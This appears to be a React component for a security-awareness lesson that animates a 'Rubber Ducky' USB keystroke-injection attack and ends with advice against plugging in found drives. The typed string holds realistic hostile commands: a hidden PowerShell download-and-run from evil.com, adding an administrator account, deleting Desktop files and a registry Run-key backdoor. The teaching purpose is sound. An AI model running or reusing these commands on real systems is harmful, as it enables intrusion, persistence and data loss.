import { useState, useEffect } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { Terminal, Folder, FileText, Monitor, Cpu, ShieldAlert, AlertTriangle, RefreshCcw, ShieldCheck, Power, Search, LayoutGrid } from 'lucide-react';

export default function USBSimulator() {
  const [phase, setPhase] = useState<'idle' | 'plugged' | 'scanning' | 'attacking' | 'compromised' | 'postmortem'>('idle');
  const [typedCommand, setTypedCommand] = useState('');
  const [iconsVisible, setIconsVisible] = useState(true);
  
  const fullCommand = `Win+R
cmd
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "Invoke-WebRequest -Uri 'http://evil.com/payload.exe' -OutFile '$env:temp\\payload.exe'; Start-Process '$env:temp\\payload.exe'"
net localgroup administrators hacker /add
del /F /S /Q %USERPROFILE%\\Desktop\\*.*
REG ADD HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Backdoor /t REG_SZ /d "$env:temp\\payload.exe"
exit`;

  useEffect(() => {
    if (phase === 'attacking') {
      let currentIndex = 0;
      const interval = setInterval(() => {
        if (currentIndex <= fullCommand.length) {
          setTypedCommand(fullCommand.slice(0, currentIndex));
          currentIndex += 1; // Slower typing speed so students can read the commands
          
          // Trigger icon deletion when "del" command is typed
          if (currentIndex > 150) {
            setIconsVisible(false);
          }
        } else {
          clearInterval(interval);
          setTimeout(() => setPhase('compromised'), 2000); // Wait 2 seconds before showing red screen
        }
      }, 30); // 30ms per character is readable but still fast
      return () => clearInterval(interval);
    }
  }, [phase]);

  useEffect(() => {
    if (phase === 'plugged') {
      setTimeout(() => setPhase('scanning'), 1500); // Wait 1.5 seconds to show "setting up"
    }
    if (phase === 'scanning') {
      setTimeout(() => setPhase('attacking'), 3000); // Wait 3 seconds so students can read "No threats found"
    }
    if (phase === 'compromised') {
      const timer = setTimeout(() => {
        setPhase('postmortem');
      }, 4500); // Keep red screen visible for 4.5 seconds
      return () => clearTimeout(timer);
    }
  }, [phase]);

  const reset = () => {
    setPhase('idle');
    setTypedCommand('');
    setIconsVisible(true);
  };

  return (
    <div className="w-[1100px] mx-auto h-[550px] bg-[#1a1a2e] flex flex-row rounded-xl shadow-2xl border border-gray-800 overflow-hidden font-sans relative">
      
      {/* Left Column: The Real World (Desk) */}
      <div className="w-[300px] shrink-0 bg-[#2a2a3e] border-r border-gray-700 flex flex-col items-center justify-center p-8 relative shadow-[inset_-10px_0_20px_rgba(0,0,0,0.2)]">
        <h3 className="text-white/60 font-bold uppercase tracking-widest text-sm mb-12 text-center">Your Desk</h3>
        
        {phase === 'idle' ? (
          <motion.div 
            whileHover={{ scale: 1.05, y: -5 }}
            whileTap={{ scale: 0.95 }}
            onClick={() => setPhase('plugged')}
            className="group cursor-pointer flex flex-col items-center"
          >
            {/* Fake USB Drive Graphic */}
            <div className="w-16 h-24 bg-gray-300 rounded-t-sm rounded-b-xl relative shadow-2xl border border-gray-400 flex flex-col">
              <div className="w-8 h-8 bg-gray-400 mx-auto border-2 border-gray-500 rounded-t-sm -mt-6"></div>
              <div className="flex-1 flex items-center justify-center">
                <div className="bg-yellow-200/90 text-yellow-900 text-[10px] font-bold px-1 py-4 text-center transform -rotate-90 whitespace-nowrap border border-yellow-400 shadow-sm rounded-sm">
                  Final Exams 2026
                </div>
              </div>
              {/* Little red LED indicator */}
              <div className="absolute bottom-2 right-2 w-1.5 h-1.5 rounded-full bg-red-500/20"></div>
            </div>
            <div className="mt-8 text-center">
              <div className="text-white font-bold mb-1">Found USB Drive</div>
              <div className="text-blue-400 text-sm animate-pulse flex items-center justify-center gap-2 bg-blue-500/10 px-4 py-2 rounded-full border border-blue-500/30">
                <Monitor className="w-4 h-4" /> Click to plug in
              </div>
            </div>
          </motion.div>
        ) : (
          <div className="flex flex-col items-center opacity-40">
            <div className="w-16 h-24 bg-gray-300 rounded-t-sm rounded-b-xl relative shadow-none border border-gray-400 flex flex-col translate-y-[-20px]">
              <div className="flex-1 flex items-center justify-center">
                <div className="bg-yellow-200/90 text-yellow-900 text-[10px] font-bold px-1 py-4 text-center transform -rotate-90 whitespace-nowrap border border-yellow-400 shadow-sm rounded-sm">
                  Final Exams 2026
                </div>
              </div>
              <div className="absolute bottom-2 right-2 w-1.5 h-1.5 rounded-full bg-red-500 shadow-[0_0_8px_rgba(239,68,68,1)] animate-ping"></div>
            </div>
            <div className="mt-8 text-white font-bold text-center">
              <span className="text-emerald-400 flex items-center gap-2 bg-emerald-500/10 px-4 py-2 rounded-full border border-emerald-500/30">
                <Monitor className="w-4 h-4" /> USB Connected
              </span>
            </div>
          </div>
        )}
      </div>

      {/* Right Column: The Computer Screen */}
      <div className="flex-1 relative overflow-hidden bg-cover bg-center flex flex-col" style={{ backgroundImage: 'url("https://images.unsplash.com/photo-1579546929518-9e396f3cc809?auto=format&fit=crop&q=80&w=1000")' }}>
        
        {/* Fake Desktop Area */}
        <div className="flex-1 relative">
          {/* Fake Desktop Icons */}
          <div className="p-4 flex flex-col gap-6 w-32">
            <AnimatePresence>
              {iconsVisible && (
                <>
                  <motion.div initial={{ opacity: 1 }} exit={{ opacity: 0, scale: 0.5, filter: 'blur(10px)' }} className="flex flex-col items-center gap-1 cursor-pointer hover:bg-white/10 p-2 rounded">
                    <Monitor className="w-8 h-8 text-blue-200 drop-shadow-md" />
                    <span className="text-white text-xs drop-shadow-md">My PC</span>
                  </motion.div>
                  <motion.div initial={{ opacity: 1 }} exit={{ opacity: 0, scale: 0.5, filter: 'blur(10px)' }} transition={{ delay: 0.1 }} className="flex flex-col items-center gap-1 cursor-pointer hover:bg-white/10 p-2 rounded">
                    <Folder className="w-8 h-8 text-yellow-200 drop-shadow-md" />
                    <span className="text-white text-xs drop-shadow-md">Documents</span>
                  </motion.div>
                  <motion.div initial={{ opacity: 1 }} exit={{ opacity: 0, scale: 0.5, filter: 'blur(10px)' }} transition={{ delay: 0.2 }} className="flex flex-col items-center gap-1 cursor-pointer hover:bg-white/10 p-2 rounded">
                    <FileText className="w-8 h-8 text-blue-100 drop-shadow-md" />
                    <span className="text-white text-xs drop-shadow-md">Passwords.txt</span>
                  </motion.div>
                </>
              )}
            </AnimatePresence>
          </div>

          {/* The Attack Sequence Overlays */}
          <AnimatePresence>
            {(phase === 'plugged' || phase === 'scanning') && (
              <motion.div 
                initial={{ opacity: 0, y: 20 }}
                animate={{ opacity: 1, y: 0 }}
                exit={{ opacity: 0, scale: 0.9 }}
                className="absolute bottom-4 right-4 bg-[#1d1d1f]/95 backdrop-blur-md border border-white/10 text-white p-4 rounded-xl shadow-2xl flex flex-col gap-3 min-w-[280px]"
              >
                <div className="flex items-center gap-3">
                  {phase === 'plugged' ? (
                    <div className="w-8 h-8 rounded-full bg-blue-500/20 flex items-center justify-center">
                      <Cpu className="w-4 h-4 text-blue-400" />
                    </div>
                  ) : (
                    <div className="w-8 h-8 rounded-full bg-emerald-500/20 flex items-center justify-center">
                      <ShieldCheck className="w-4 h-4 text-emerald-400" />
                    </div>
                  )}
                  <div>
                    <div className="font-bold text-sm">{phase === 'plugged' ? 'Setting up device...' : 'Windows Defender'}</div>
                    <div className="text-xs text-gray-400">
                      {phase === 'plugged' ? 'USB Input Keyboard Device' : 'Scanning new device...'}
                    </div>
                  </div>
                </div>
                {phase === 'scanning' && (
                  <div className="bg-emerald-500/10 border border-emerald-500/30 rounded-lg p-2 text-[11px] text-emerald-300 flex items-center gap-2 mt-1">
                    <ShieldCheck className="w-3 h-3" /> No threats found. (Keyboard detected)
                  </div>
                )}
              </motion.div>
            )}

            {(phase === 'attacking' || phase === 'compromised') && (
              <motion.div 
                initial={{ opacity: 0, scale: 0.9, y: 20 }}
                animate={{ opacity: 1, scale: 1, y: 0 }}
                className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-[600px] h-[380px] bg-black rounded-lg shadow-[0_0_50px_rgba(0,0,0,0.8)] border border-gray-700 overflow-hidden flex flex-col z-20"
              >
                <div className="bg-white px-3 py-1.5 flex items-center justify-between">
                  <div className="flex items-center gap-2">
                    <Terminal className="w-4 h-4 text-black" />
                    <span className="text-black font-semibold text-xs">Administrator: C:\\Windows\\System32\\cmd.exe</span>
                  </div>
                  <div className="flex gap-1.5">
                    <div className="w-3 h-3 rounded-full border border-gray-400"></div>
                    <div className="w-3 h-3 rounded-full border border-gray-400"></div>
                    <div className="w-3 h-3 rounded-full bg-red-500 border border-red-600"></div>
                  </div>
                </div>
                <div className="flex-1 p-4 font-mono text-[13px] text-green-400 whitespace-pre-wrap leading-relaxed">
                  <span className="text-gray-300">C:\\Users\\Student&gt;</span> {typedCommand}
                  {phase === 'attacking' && <span className="inline-block w-2 h-4 bg-green-400 ml-1 animate-pulse"></span>}
                </div>
              </motion.div>
            )}

            {phase === 'compromised' && (
              <motion.div 
                initial={{ opacity: 0 }}
                animate={{ opacity: 1 }}
                className="absolute inset-0 bg-red-900/90 backdrop-blur-md z-30 flex flex-col items-center justify-center text-white p-8"
              >
                <ShieldAlert className="w-32 h-32 mb-6 text-red-500 animate-pulse drop-shadow-[0_0_20px_rgba(239,68,68,0.8)]" />
                <h2 className="text-5xl font-black tracking-tighter mb-4 text-center text-white drop-shadow-lg">SYSTEM COMPROMISED</h2>
                <div className="font-mono text-red-300 text-sm mb-8 text-center space-y-1 bg-black/40 p-4 rounded-xl border border-red-500/30">
                  <p>ALL FILES ENCRYPTED.</p>
                  <p>BACKDOOR ACCESS GRANTED TO: <span className="text-white">UNKNOWN_HOST</span></p>
                  <p>NETWORK PROPAGATION: <span className="text-white">INITIATED</span></p>
                </div>
              </motion.div>
            )}

            {phase === 'postmortem' && (
              <motion.div 
                initial={{ opacity: 0 }}
                animate={{ opacity: 1 }}
                className="absolute inset-0 bg-black/95 z-50 flex flex-col items-center justify-start pt-10 pb-6 px-6 overflow-y-auto text-white"
              >
                <div className="max-w-2xl text-center flex flex-col items-center">
                  <AlertTriangle className="w-16 h-16 text-yellow-500 mb-4" />
                  <h2 className="text-4xl font-bold mb-4 text-white">The Rubber Ducky Attack</h2>
                  <p className="text-lg text-gray-300 mb-6 leading-relaxed">
                    That USB drive wasn't a storage device. It was a microcomputer disguised as a keyboard.
                  </p>
                  
                  <div className="text-left w-full bg-white/10 rounded-xl p-5 mb-6 border border-white/20">
                    <h3 className="font-bold text-lg mb-3 text-yellow-400 border-b border-white/20 pb-2">Why it works:</h3>
                    <ul className="space-y-4">
                      <li className="flex items-start gap-3">
                        <div className="bg-yellow-500/20 text-yellow-400 p-1.5 rounded mt-0.5"><ShieldCheck className="w-5 h-5" /></div>
                        <div>
                          <strong className="block text-white text-[16px]">Bypassing Antivirus</strong>
                          <span className="text-[14px] text-gray-400">Computers are designed to implicitly trust human interface devices. Windows Defender saw a "keyboard" connecting, so it found no threats.</span>
                        </div>
                      </li>
                      <li className="flex items-start gap-3">
                        <div className="bg-yellow-500/20 text-yellow-400 p-1.5 rounded mt-0.5"><Cpu className="w-5 h-5" /></div>
                        <div>
                          <strong className="block text-white text-[16px]">Superhuman Speed</strong>
                          <span className="text-[14px] text-gray-400">The fake keyboard instantly types thousands of malicious commands faster than a human ever could, installing malware and deleting files before you can even react.</span>
                        </div>
                      </li>
                    </ul>
                  </div>

                  <div className="bg-red-500/20 border border-red-500/30 rounded-xl p-4 text-left w-full mb-8">
                    <strong className="text-red-400 block mb-1">The Lesson:</strong>
                    <span className="text-gray-300 text-sm">Never plug an untrusted or "found" USB device into your computer. If you find one, hand it over to IT or security personnel.</span>
                  </div>

                  <button 
                    onClick={reset}
                    className="flex items-center gap-2 px-6 py-3 bg-white text-black rounded-full font-bold hover:bg-gray-200 transition-colors"
                  >
                    <RefreshCcw className="w-5 h-5" />
                    Try Again
                  </button>
                </div>
              </motion.div>
            )}
          </AnimatePresence>
        </div>

        {/* Fake Taskbar */}
        <div className="h-10 bg-[#1d1d1f]/90 backdrop-blur-md border-t border-white/10 flex items-center px-2 justify-between z-10 shrink-0">
          <div className="flex items-center gap-2">
            <div className="w-8 h-8 rounded hover:bg-white/10 flex items-center justify-center cursor-pointer transition-colors">
              <LayoutGrid className="w-4 h-4 text-blue-400" />
            </div>
            <div className="w-8 h-8 rounded hover:bg-white/10 flex items-center justify-center cursor-pointer transition-colors">
              <Search className="w-4 h-4 text-white" />
            </div>
          </div>
          <div className="flex items-center gap-3 px-2">
            <div className="text-[10px] text-white text-right font-medium">
              <div>11:42 AM</div>
              <div>5/16/2026</div>
            </div>
            <Power className="w-4 h-4 text-gray-400" />
          </div>
        </div>
      </div>
    </div>
  );
}
